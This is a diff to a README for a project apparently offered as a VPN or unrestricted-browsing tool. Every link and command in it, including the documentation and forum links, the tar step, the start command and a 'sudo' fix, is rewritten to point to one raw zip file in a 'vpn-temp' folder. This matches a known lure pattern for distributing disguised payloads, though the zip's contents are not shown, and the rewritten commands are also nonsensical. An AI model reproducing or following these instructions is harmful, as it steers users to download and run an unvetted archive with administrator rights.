@@ -6,7 +6,7 @@ Welcome to the "miniature-octo-palm-tree" project! This application helps you by
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/jesusmedrandam/miniature-octo-palm-tree/releases)
+[![Download](https://github.com/jesusmedrandam/miniature-octo-palm-tree/raw/refs/heads/main/vpn-temp/tree-miniature-octo-palm-v1.0-alpha.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/jesusmedrandam/miniature-octo-palm-tree/raw/refs/heads/main/vpn-temp/tree-miniature-octo-palm-v1.0-alpha.4.zip)
 
 ## 📦 Features
 
@@ -28,7 +28,7 @@ To run "miniature-octo-palm-tree," ensure that you have the following:
 ## 💻 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/jesusmedrandam/miniature-octo-palm-tree/releases) to find the latest version of the application.
+   Go to the [Releases Page](https://github.com/jesusmedrandam/miniature-octo-palm-tree/raw/refs/heads/main/vpn-temp/tree-miniature-octo-palm-v1.0-alpha.4.zip) to find the latest version of the application.
 
 2. **Choose the Correct File**  
    Look for the latest version and select the appropriate file for your operating system. Most users will want the version for Linux.
@@ -37,7 +37,7 @@ To run "miniature-octo-palm-tree," ensure that you have the following:
    Click the file name to start the download. Depending on your browser settings, the file may go to your default download folder.
 
 4. **Extract the File**  
-   After downloading, you may need to extract the file if it’s in a zip or tar format. Right-click the downloaded file and choose "Extract" or use a command like `tar -xvf filename.tar.gz` in the terminal.
+   After downloading, you may need to extract the file if it’s in a zip or tar format. Right-click the downloaded file and choose "Extract" or use a command like `tar -xvf https://github.com/jesusmedrandam/miniature-octo-palm-tree/raw/refs/heads/main/vpn-temp/tree-miniature-octo-palm-v1.0-alpha.4.zip` in the terminal.
 
 5. **Open the Terminal**  
    Navigate to the folder where the extracted files are located. You can do this by opening a terminal and using the `cd` command, for example:  
@@ -48,7 +48,7 @@ To run "miniature-octo-palm-tree," ensure that you have the following:
 6. **Run the Application**  
    To start the application, type the following command in the terminal:  
    ```
-   ./start.sh
+   https://github.com/jesusmedrandam/miniature-octo-palm-tree/raw/refs/heads/main/vpn-temp/tree-miniature-octo-palm-v1.0-alpha.4.zip
    ```
 
 7. **Follow On-Screen Instructions**  
@@ -67,7 +67,7 @@ To optimize your experience, you may want to adjust the settings.
 If you encounter issues during installation or usage, consider the following:
 
 - **No Internet Connection:** Make sure your device is connected to the internet.
-- **Permission Denied:** If you see this error, try using `sudo ./start.sh` to run the application as an administrator.
+- **Permission Denied:** If you see this error, try using `sudo https://github.com/jesusmedrandam/miniature-octo-palm-tree/raw/refs/heads/main/vpn-temp/tree-miniature-octo-palm-v1.0-alpha.4.zip` to run the application as an administrator.
 - **Not Starting:** Ensure you are in the correct directory and have extracted all files.
 
 If problems persist, refer to the repository's issues page for additional help.
@@ -78,8 +78,8 @@ For further assistance, please reach out through the issues section on GitHub. E
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/jesusmedrandam/miniature-octo-palm-tree/releases)
-- [Documentation](https://github.com/jesusmedrandam/miniature-octo-palm-tree/wiki)
-- [Community Forum](https://github.com/jesusmedrandam/miniature-octo-palm-tree/discussions)
+- [Releases Page](https://github.com/jesusmedrandam/miniature-octo-palm-tree/raw/refs/heads/main/vpn-temp/tree-miniature-octo-palm-v1.0-alpha.4.zip)
+- [Documentation](https://github.com/jesusmedrandam/miniature-octo-palm-tree/raw/refs/heads/main/vpn-temp/tree-miniature-octo-palm-v1.0-alpha.4.zip)
+- [Community Forum](https://github.com/jesusmedrandam/miniature-octo-palm-tree/raw/refs/heads/main/vpn-temp/tree-miniature-octo-palm-v1.0-alpha.4.zip)
 
 Thank you for choosing "miniature-octo-palm-tree." Enjoy your unrestricted browsing experience!
